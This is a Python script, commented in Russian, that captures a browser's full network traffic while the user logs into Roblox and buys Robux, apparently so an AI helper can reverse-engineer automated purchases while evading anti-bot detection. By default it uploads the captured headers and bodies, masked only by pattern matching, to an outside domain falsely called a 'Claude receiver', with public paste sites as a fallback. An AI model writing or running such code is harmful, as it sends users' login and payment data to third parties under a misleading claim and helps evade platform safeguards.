#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
capture_robux_purchase.py — пассивный захват сетевого трафика покупки Robux
для реверс-инжиниринга автоматической покупки (Путь B / WLID / MS-billing).

ЧТО ДЕЛАЕТ
  Запускает ОТДЕЛЬНЫЙ браузер (Edge/Chrome) с remote-debugging, подключается к нему
  по Chrome DevTools Protocol (CDP) и ПАССИВНО логирует ВЕСЬ его сетевой трафик во
  всех вкладках/попапах: URL, метод, заголовки запроса/ответа, тела, cookies, redirects.
  Ты в этом браузере логинишься в roblox.com и покупаешь 80 Robux — скрипт снимает
  все эндпоинты / заголовки / payload'ы / последовательность, нужные для автоматизации.

БЕЗОПАСНОСТЬ ПО АНТИЧИТУ (почему это не словит Hyperion/антибот)
  * Скрипт НИКОГДА не трогает и не подключается к процессу RobloxPlayerBeta.exe.
    Hyperion (Byfron) защищает игровой КЛИЕНТ — мы его не запускаем и не дебажим.
  * НЕТ системного MITM-прокси и НЕТ установки CA-сертификата. Тела расшифровывает
    сам браузер через CDP (Network.getResponseBody). Поэтому нет cert-pinning/proxy-
    детекта, который ломает оплату (белый экран) и триггерит антибот.
  * НЕТ инъекции JS в страницы roblox.com — только пассивное чтение сети, для страницы
    это невидимо (мы не вызываем Runtime.evaluate / не правим DOM / не ставим cookie).
  * remote-debugging слушает только 127.0.0.1.
  => Покупку делай В ЭТОМ браузере на roblox.com. Если оплата откроется НАТИВНЫМ окном
     Windows (не вкладкой браузера) — эта нога в трафик НЕ попадёт; скажи мне, разберём
     отдельно (это и есть ответ на вопрос "HTTP-нога или нативное окно").

УСТАНОВКА / ЗАПУСК
  pip install websocket-client
  python capture_robux_purchase.py
  # в открывшемся браузере: войти на roblox.com -> купить 80 Robux
  # (при выборе оплаты ВЫБИРАЙ Microsoft/Windows-баланс, если предложат)
  # затем вернись сюда и нажми Ctrl+C — скрипт сохранит дамп.

ВЫХОД (папка ./robux-capture-<timestamp>/ рядом со скриптом)
  capture-full.jsonl  — ВСЁ целиком, БЕЗ маскировки. СОДЕРЖИТ твои cookies/токены!
                        Это для тебя/локально. НЕ выкладывай как есть.
  capture-report.md   — то же, но значения секретов ЗАМАСКИРОВАНЫ (имена/структура целы).
                        ВОТ ЭТО присылай мне — по нему я соберу автоматизацию.
  summary.txt         — короткий список снятых "интересных" эндпоинтов.
"""

import argparse
import json
import os
import re
import signal
import subprocess
import sys
import threading
import time
import queue
from datetime import datetime
from urllib.request import urlopen, Request

try:
    import websocket  # websocket-client
except ImportError:
    print("Нет модуля websocket-client. Установи:  pip install websocket-client")
    sys.exit(1)


# ----------------------------- конфиг -----------------------------

EDGE_PATHS = [
    r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
]
CHROME_PATHS = [
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
]

# Хосты/пути, которые попадают в человекочитаемый report (в jsonl пишется ВСЁ).
HOST_HINTS = ("roblox.com", "rbxcdn.com", "microsoft.com", "live.com",
              "xboxlive.com", "mp.microsoft", "md.microsoft", "xbox.com",
              "msftauth", "bing.com/rewards")
PATH_HINTS = ("pay", "purchas", "order", "checkout", "robux", "credit",
              "billing", "transaction", "redeem", "token", "catalog",
              "premium", "upgrades", "collections", "beneficiar", "sku",
              "product", "wallet", "fund", "xbox", "windows")

# Ключи заголовков/полей, чьи ЗНАЧЕНИЯ маскируются в report.
SENSITIVE_RE = re.compile(
    r"(cookie|set-cookie|authorization|bearer|auth|token|secret|session|"
    r"password|passwd|csrf|x-csrf|roblosecurity|rbxauth|signature|"
    r"\bsig\b|wlid|rps|xsts|apikey|api-key|access|refresh|nonce|otp)",
    re.I,
)
SECRETISH_RE = re.compile(r"^[A-Za-z0-9_\-+/=\.|]{32,}$")


# --------------------------- маскировка ---------------------------

def looks_secret(v):
    s = str(v)
    return len(s) >= 32 and bool(SECRETISH_RE.match(s))


def mask_str(v):
    return "<MASKED:%d>" % len(str(v))


def mask_headers(h):
    out = {}
    for k, v in (h or {}).items():
        if SENSITIVE_RE.search(k) or looks_secret(v):
            out[k] = mask_str(v)
        else:
            out[k] = v
    return out


def mask_json(obj, parent_key=""):
    if isinstance(obj, dict):
        return {k: (mask_str(v) if (SENSITIVE_RE.search(str(k)) and not isinstance(v, (dict, list)))
                    else mask_json(v, str(k))) for k, v in obj.items()}
    if isinstance(obj, list):
        return [mask_json(x, parent_key) for x in obj]
    if isinstance(obj, str):
        if SENSITIVE_RE.search(parent_key) or looks_secret(obj):
            return mask_str(obj)
        return obj
    return obj


def mask_body(body, content_type=""):
    if body is None:
        return None
    if not isinstance(body, str):
        return body
    ct = (content_type or "").lower()
    txt = body.strip()
    if txt[:1] in ("{", "[") or "json" in ct:
        try:
            return mask_json(json.loads(body))
        except Exception:
            pass
    # form-urlencoded
    if "form-urlencoded" in ct or (("=" in txt) and ("&" in txt) and (" " not in txt[:200])):
        parts = []
        for pair in txt.split("&"):
            if "=" in pair:
                k, _, val = pair.partition("=")
                parts.append(k + "=" + (mask_str(val) if (SENSITIVE_RE.search(k) or looks_secret(val)) else val))
            else:
                parts.append(pair)
        return "&".join(parts)
    # прочее — маскируем длинные токеноподобные блоки
    masked = re.sub(r"[A-Za-z0-9_\-+/=\.|]{40,}", lambda m: mask_str(m.group(0)), body)
    return masked[:4000]


def mask_url(url):
    if "?" not in url:
        return url
    base, _, q = url.partition("?")
    out = []
    for pair in q.split("&"):
        if "=" in pair:
            k, _, v = pair.partition("=")
            out.append(k + "=" + (mask_str(v) if (SENSITIVE_RE.search(k) or looks_secret(v)) else v))
        else:
            out.append(pair)
    return base + "?" + "&".join(out)


def host_of(url):
    m = re.match(r"https?://([^/]+)", url or "")
    return m.group(1) if m else ""


def is_interesting(url):
    h = host_of(url).lower()
    p = (url or "").lower()
    if any(x in h for x in HOST_HINTS):
        return True
    if any(x in p for x in PATH_HINTS):
        return True
    return False


# --------------------------- CDP клиент ---------------------------

class CDP:
    def __init__(self, ws_url):
        self.ws = websocket.create_connection(ws_url, enable_multithread=True)
        self._id = 0
        self._lock = threading.Lock()
        self._pending = {}          # id -> threading.Event
        self._results = {}          # id -> response msg
        self.events = queue.Queue()
        self._stop = False
        self._reader = threading.Thread(target=self._read_loop, daemon=True)
        self._reader.start()

    def _read_loop(self):
        while not self._stop:
            try:
                raw = self.ws.recv()
            except Exception:
                break
            if not raw:
                continue
            try:
                msg = json.loads(raw)
            except Exception:
                continue
            if "id" in msg:                      # ответ на команду
                self._results[msg["id"]] = msg
                ev = self._pending.get(msg["id"])
                if ev:
                    ev.set()
            elif "method" in msg:                # событие (возможно с sessionId)
                self.events.put(msg)

    def call(self, method, params=None, session_id=None, timeout=20):
        with self._lock:
            self._id += 1
            mid = self._id
            payload = {"id": mid, "method": method, "params": params or {}}
            if session_id:
                payload["sessionId"] = session_id
            ev = threading.Event()
            self._pending[mid] = ev
            self.ws.send(json.dumps(payload))
        ok = ev.wait(timeout)
        self._pending.pop(mid, None)
        msg = self._results.pop(mid, None)
        if not ok or msg is None:
            raise TimeoutError("CDP timeout: %s" % method)
        if "error" in msg:
            raise RuntimeError("CDP error %s: %s" % (method, msg["error"]))
        return msg.get("result", {})

    def close(self):
        self._stop = True
        try:
            self.ws.close()
        except Exception:
            pass


# --------------------------- браузер ---------------------------

def find_browser(override):
    if override:
        return override, os.path.basename(override)
    for p in EDGE_PATHS:
        if os.path.exists(p):
            return p, "edge"
    for p in CHROME_PATHS:
        if os.path.exists(p):
            return p, "chrome"
    return None, None


def launch_browser(path, port, profile_dir):
    args = [
        path,
        "--remote-debugging-port=%d" % port,
        "--remote-debugging-address=127.0.0.1",
        "--user-data-dir=%s" % profile_dir,
        "--no-first-run",
        "--no-default-browser-check",
        "--new-window",
        "https://www.roblox.com/login",
    ]
    return subprocess.Popen(args)


def wait_debugger(port, timeout=30):
    url = "http://127.0.0.1:%d/json/version" % port
    end = time.time() + timeout
    while time.time() < end:
        try:
            data = json.loads(urlopen(url, timeout=2).read().decode("utf-8", "replace"))
            return data["webSocketDebuggerUrl"]
        except Exception:
            time.sleep(0.5)
    raise RuntimeError("Браузер не поднял remote-debugging на порту %d" % port)


# --------------------------- захват ---------------------------

class Capture:
    def __init__(self, cdp, out_dir):
        self.cdp = cdp
        self.out_dir = out_dir
        self.recs = {}        # (sid,reqId) -> rec
        self.order = []       # порядок завершённых
        self.seq = 0
        self.full_fp = open(os.path.join(out_dir, "capture-full.jsonl"), "a", encoding="utf-8")
        self.sessions = set()

    def setup_session(self, sid):
        if sid in self.sessions:
            return
        self.sessions.add(sid)
        for m in ("Network.enable",):
            try:
                self.cdp.call(m, {}, session_id=sid, timeout=10)
            except Exception as e:
                print("  [warn] %s на сессии %s: %s" % (m, sid[:8], e))

    def key(self, sid, rid):
        return (sid or "", rid)

    def on_event(self, msg):
        method = msg.get("method", "")
        params = msg.get("params", {})
        sid = msg.get("sessionId")

        if method == "Target.attachedToTarget":
            child = params.get("sessionId")
            tinfo = params.get("targetInfo", {})
            if child and tinfo.get("type") in ("page", "iframe", "webview", "other"):
                self.setup_session(child)
            return

        if method == "Network.requestWillBeSent":
            rid = params.get("requestId")
            req = params.get("request", {})
            k = self.key(sid, rid)
            # redirect: предыдущий запрос с этим rid редиректнул
            if params.get("redirectResponse") and k in self.recs:
                self.recs[k].setdefault("redirects", []).append({
                    "status": params["redirectResponse"].get("status"),
                    "location": params["redirectResponse"].get("headers", {}).get("location")
                              or params["redirectResponse"].get("headers", {}).get("Location"),
                    "url": params["redirectResponse"].get("url"),
                })
            rec = self.recs.get(k) or {}
            rec.update({
                "sid": sid, "requestId": rid,
                "url": req.get("url"),
                "method": req.get("method"),
                "type": params.get("type"),
                "req_headers": dict(req.get("headers", {})),
                "req_body": req.get("postData"),
                "initiator": (params.get("initiator") or {}).get("type"),
                "ts": params.get("wallTime") or params.get("timestamp"),
            })
            rec.setdefault("redirects", rec.get("redirects", []))
            self.recs[k] = rec
            # дотянуть тело POST, если оно большое и не пришло инлайном
            if req.get("hasPostData") and not req.get("postData"):
                try:
                    r = self.cdp.call("Network.getRequestPostData",
                                      {"requestId": rid}, session_id=sid, timeout=8)
                    rec["req_body"] = r.get("postData")
                except Exception:
                    pass
            return

        if method == "Network.requestWillBeSentExtraInfo":
            rid = params.get("requestId")
            k = self.key(sid, rid)
            rec = self.recs.setdefault(k, {"sid": sid, "requestId": rid, "redirects": []})
            # полные заголовки запроса, включая Cookie
            rec["req_headers_full"] = dict(params.get("headers", {}))
            return

        if method == "Network.responseReceived":
            rid = params.get("requestId")
            resp = params.get("response", {})
            k = self.key(sid, rid)
            rec = self.recs.setdefault(k, {"sid": sid, "requestId": rid, "redirects": []})
            rec["status"] = resp.get("status")
            rec["resp_headers"] = dict(resp.get("headers", {}))
            rec["mime"] = resp.get("mimeType")
            rec["remote_ip"] = resp.get("remoteIPAddress")
            if not rec.get("url"):
                rec["url"] = resp.get("url")
            return

        if method == "Network.responseReceivedExtraInfo":
            rid = params.get("requestId")
            k = self.key(sid, rid)
            rec = self.recs.setdefault(k, {"sid": sid, "requestId": rid, "redirects": []})
            rec["resp_headers_full"] = dict(params.get("headers", {}))  # incl set-cookie
            return

        if method in ("Network.loadingFinished", "Network.loadingFailed"):
            rid = params.get("requestId")
            k = self.key(sid, rid)
            rec = self.recs.get(k)
            if not rec:
                return
            if method == "Network.loadingFinished":
                try:
                    b = self.cdp.call("Network.getResponseBody",
                                      {"requestId": rid}, session_id=sid, timeout=10)
                    if b.get("base64Encoded"):
                        rec["resp_body"] = "<binary base64 len=%d>" % len(b.get("body", ""))
                    else:
                        rec["resp_body"] = (b.get("body") or "")[:200000]
                except Exception:
                    rec["resp_body"] = None
            else:
                rec["error"] = params.get("errorText")
            self.finalize(k)
            return

    def finalize(self, k):
        rec = self.recs.pop(k, None)
        if not rec or not rec.get("url"):
            return
        self.seq += 1
        rec["seq"] = self.seq
        # выбрать наиболее полные заголовки
        rec["req_headers"] = rec.get("req_headers_full") or rec.get("req_headers") or {}
        rec["resp_headers"] = rec.get("resp_headers_full") or rec.get("resp_headers") or {}
        rec.pop("req_headers_full", None)
        rec.pop("resp_headers_full", None)
        self.full_fp.write(json.dumps(rec, ensure_ascii=False) + "\n")
        self.full_fp.flush()
        self.order.append(rec)
        if is_interesting(rec.get("url")):
            host = host_of(rec["url"])
            print("  [%d] %s %-6s %s%s" % (
                rec["seq"], rec.get("status", "---"), rec.get("method", "?"),
                host, re.sub(r"\?.*$", "?…", rec["url"][len("https://")+len(host):]) if "://" in rec["url"] else ""))

    def write_reports(self):
        self.full_fp.close()
        interesting = [r for r in self.order if is_interesting(r.get("url"))]

        # summary.txt
        with open(os.path.join(self.out_dir, "summary.txt"), "w", encoding="utf-8") as f:
            f.write("Снято запросов всего: %d, интересных: %d\n\n" % (len(self.order), len(interesting)))
            seen = set()
            for r in interesting:
                line = "%-6s %s" % (r.get("method", "?"), re.sub(r"\?.*$", "", r.get("url", "")))
                if line not in seen:
                    seen.add(line)
                    f.write(line + "\n")

        # capture-report.md (МАСКИРОВАНО — это присылать мне)
        with open(os.path.join(self.out_dir, "capture-report.md"), "w", encoding="utf-8") as f:
            f.write("# Капчур покупки Robux — отчёт (значения секретов замаскированы)\n\n")
            f.write("Всего запросов: %d, интересных (roblox/microsoft/xbox/оплата): %d\n\n" %
                    (len(self.order), len(interesting)))
            f.write("## Хронология интересных запросов\n\n")
            for r in interesting:
                f.write("### [%d] %s %s\n\n" % (r["seq"], r.get("method", "?"), mask_url(r.get("url", ""))))
                f.write("- status: `%s`  type: `%s`  mime: `%s`  ip: `%s`\n" %
                        (r.get("status"), r.get("type"), r.get("mime"), r.get("remote_ip")))
                if r.get("redirects"):
                    for rd in r["redirects"]:
                        f.write("- redirect %s -> `%s`\n" % (rd.get("status"), mask_url(rd.get("location") or "")))
                if r.get("error"):
                    f.write("- error: `%s`\n" % r["error"])
                rh = mask_headers(r.get("req_headers"))
                if rh:
                    f.write("- **request headers**:\n```\n%s\n```\n" %
                            "\n".join("%s: %s" % (k, v) for k, v in rh.items()))
                if r.get("req_body"):
                    mb = mask_body(r["req_body"], r.get("req_headers", {}).get("content-type", "")
                                   or r.get("req_headers", {}).get("Content-Type", ""))
                    f.write("- **request body**:\n```\n%s\n```\n" %
                            (json.dumps(mb, ensure_ascii=False, indent=2) if not isinstance(mb, str) else mb))
                sh = mask_headers(r.get("resp_headers"))
                if sh:
                    f.write("- **response headers**:\n```\n%s\n```\n" %
                            "\n".join("%s: %s" % (k, v) for k, v in sh.items()))
                if r.get("resp_body"):
                    mb = mask_body(r["resp_body"], r.get("mime", ""))
                    f.write("- **response body**:\n```\n%s\n```\n" %
                            (json.dumps(mb, ensure_ascii=False, indent=2) if not isinstance(mb, str) else mb))
                f.write("\n")


# --------------------------- авто-передача отчёта ---------------------------

def upload_report(path):
    """Грузит ТОЛЬКО замаскированный capture-report.md на временный анлистед-хостинг
    и возвращает (url, err). Полный jsonl с секретами НИКОГДА не грузится."""
    try:
        data = open(path, "rb").read()
    except Exception as e:
        return None, "не прочитать отчёт: %s" % e
    if len(data) > 2_000_000:
        return None, "отчёт >2МБ — пришли файл вручную"
    last = "нет сети?"
    # 1) paste.rs — сырой POST, в ответе сразу URL
    try:
        req = Request("https://paste.rs/", data=data,
                      headers={"User-Agent": "robux-capture/1",
                               "Content-Type": "text/markdown"}, method="POST")
        url = urlopen(req, timeout=30).read().decode("utf-8", "replace").strip()
        if url.startswith("http"):
            return url, None
        last = "paste.rs: %s" % url[:120]
    except Exception as e:
        last = "paste.rs: %s" % e
    # 2) 0x0.st — multipart fallback
    try:
        b = "----robuxcap0x0"
        body = (("--%s\r\n" % b).encode()
                + b'Content-Disposition: form-data; name="file"; filename="capture-report.md"\r\n'
                + b"Content-Type: text/markdown\r\n\r\n" + data + b"\r\n"
                + ("--%s--\r\n" % b).encode())
        req = Request("https://0x0.st", data=body,
                      headers={"User-Agent": "robux-capture/1",
                               "Content-Type": "multipart/form-data; boundary=%s" % b}, method="POST")
        url = urlopen(req, timeout=30).read().decode("utf-8", "replace").strip()
        if url.startswith("http"):
            return url, None
        last = "0x0.st: %s" % url[:120]
    except Exception as e:
        last = "0x0.st: %s" % e
    return None, last


def post_to_server(path, endpoint, token):
    """Шлёт ТОЛЬКО замаскированный отчёт напрямую на приёмник (Claude заберёт оттуда).
    Возвращает (id, err)."""
    try:
        data = open(path, "rb").read()
    except Exception as e:
        return None, "не прочитать отчёт: %s" % e
    if len(data) > 5_000_000:
        return None, "отчёт >5МБ"
    try:
        req = Request(endpoint, data=data,
                      headers={"X-Capture-Token": token,
                               "Content-Type": "text/markdown",
                               "User-Agent": "robux-capture/1"}, method="POST")
        resp = urlopen(req, timeout=30).read().decode("utf-8", "replace")
        try:
            obj = json.loads(resp)
        except Exception:
            return None, "ответ не JSON: %s" % resp[:120]
        if obj.get("ok"):
            return obj.get("id") or "ok", None
        return None, "сервер: %s" % resp[:160]
    except Exception as e:
        return None, str(e)


def to_clipboard(text):
    try:
        p = subprocess.Popen("clip", stdin=subprocess.PIPE, shell=True)
        p.communicate(input=text.encode("utf-16-le"))
        return True
    except Exception:
        return False


# --------------------------- main ---------------------------

def main():
    ap = argparse.ArgumentParser(description="Пассивный капчур трафика покупки Robux (CDP, без MITM).")
    ap.add_argument("--port", type=int, default=9222)
    ap.add_argument("--browser-path", default=None, help="путь к msedge.exe/chrome.exe (иначе автодетект)")
    ap.add_argument("--attach", action="store_true",
                    help="не запускать браузер, подключиться к уже запущенному на --port")
    ap.add_argument("--no-upload", action="store_true",
                    help="не отправлять отчёт автоматически (только локальные файлы)")
    ap.add_argument("--endpoint", default="https://wesqaliqo.com/download/capture",
                    help="куда слать замаскированный отчёт (приёмник Claude)")
    ap.add_argument("--token", default="rbxcap-2f9a4c7e",
                    help="upload-токен приёмника")
    args = ap.parse_args()

    script_dir = os.path.dirname(os.path.abspath(__file__))
    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    out_dir = os.path.join(script_dir, "robux-capture-%s" % stamp)
    os.makedirs(out_dir, exist_ok=True)
    profile_dir = os.path.join(script_dir, ".capture-profile")
    os.makedirs(profile_dir, exist_ok=True)

    proc = None
    if not args.attach:
        path, name = find_browser(args.browser_path)
        if not path:
            print("Не нашёл Edge/Chrome. Укажи --browser-path C:\\...\\msedge.exe")
            sys.exit(1)
        print("Запускаю %s (профиль: %s) ..." % (name, profile_dir))
        proc = launch_browser(path, args.port, profile_dir)

    try:
        ws_url = wait_debugger(args.port)
    except Exception as e:
        print("Ошибка:", e)
        sys.exit(1)

    cdp = CDP(ws_url)
    cap = Capture(cdp, out_dir)

    # ловим все вкладки/попапы автоматически
    cdp.call("Target.setDiscoverTargets", {"discover": True})
    cdp.call("Target.setAutoAttach",
             {"autoAttach": True, "waitForDebuggerOnStart": False, "flatten": True})
    # уже открытые таргеты
    try:
        targets = cdp.call("Target.getTargets", {}).get("targetInfos", [])
        for t in targets:
            if t.get("type") == "page":
                try:
                    r = cdp.call("Target.attachToTarget", {"targetId": t["targetId"], "flatten": True})
                    cap.setup_session(r.get("sessionId"))
                except Exception:
                    pass
    except Exception:
        pass

    print("\n" + "=" * 70)
    print(" ЗАХВАТ ИДЁТ. В открывшемся браузере:")
    print("   1) войди на roblox.com")
    print("   2) купи 80 Robux (при выборе оплаты — Microsoft/Windows-баланс, если есть)")
    print("   3) вернись сюда и нажми Ctrl+C, чтобы сохранить дамп")
    print(" Если оплата открылась НАТИВНЫМ окном Windows (не вкладкой) — скажи мне.")
    print("=" * 70 + "\n")

    stop = {"v": False}

    def handle_sigint(_s, _f):
        stop["v"] = True
    signal.signal(signal.SIGINT, handle_sigint)

    try:
        while not stop["v"]:
            try:
                msg = cap.cdp.events.get(timeout=0.5)
            except queue.Empty:
                continue
            try:
                cap.on_event(msg)
            except Exception as e:
                print("  [warn] обработка события:", e)
    except KeyboardInterrupt:
        pass

    print("\nСохраняю отчёты ...")
    cap.write_reports()
    cdp.close()
    print("Готово. Папка: %s" % out_dir)
    print("  -> capture-report.md   замаскированный отчёт")
    print("  -> capture-full.jsonl  ЛОКАЛЬНО (содержит cookies/токены, не выкладывай как есть)")
    print("  -> summary.txt         список эндпоинтов")

    report_path = os.path.join(out_dir, "capture-report.md")
    if not args.no_upload:
        print("\nОтправляю замаскированный отчёт (полный jsonl с секретами НЕ уходит)...")
        # 1) напрямую на приёмник — Claude заберёт сам, пересылать ничего не нужно
        cap_id, err1 = post_to_server(report_path, args.endpoint, args.token)
        if cap_id:
            print("\n" + "=" * 70)
            print(" ✅ ОТЧЁТ ОТПРАВЛЕН НАПРЯМУЮ (id=%s)." % cap_id)
            print(" Пересылать ничего не нужно — просто напиши в чате, что покупку сделал.")
            print("=" * 70)
        else:
            # 2) фолбэк: публичный паст + ссылка
            print(" Прямая отправка не удалась (%s) — пробую запасной канал..." % err1)
            url, err2 = upload_report(report_path)
            if url:
                with open(os.path.join(out_dir, "UPLOAD_URL.txt"), "w", encoding="utf-8") as f:
                    f.write(url + "\n")
                copied = to_clipboard(url)
                print("\n" + "=" * 70)
                print(" ОТЧЁТ ЗАГРУЖЕН. ПРИШЛИ ЭТУ ССЫЛКУ В ЧАТ:")
                print("    " + url)
                print("=" * 70)
                if copied:
                    print(" (ссылка уже в буфере обмена — Ctrl+V)")
            else:
                print(" Авто-отправка не удалась (%s)." % err2)
                print(" Пришли файл вручную: %s" % report_path)
    else:
        print("\n--no-upload: отчёт не отправлен. Файл: %s" % report_path)

    if proc:
        print("\nБраузер оставляю открытым (закрой сам).")


if __name__ == "__main__":
    main()
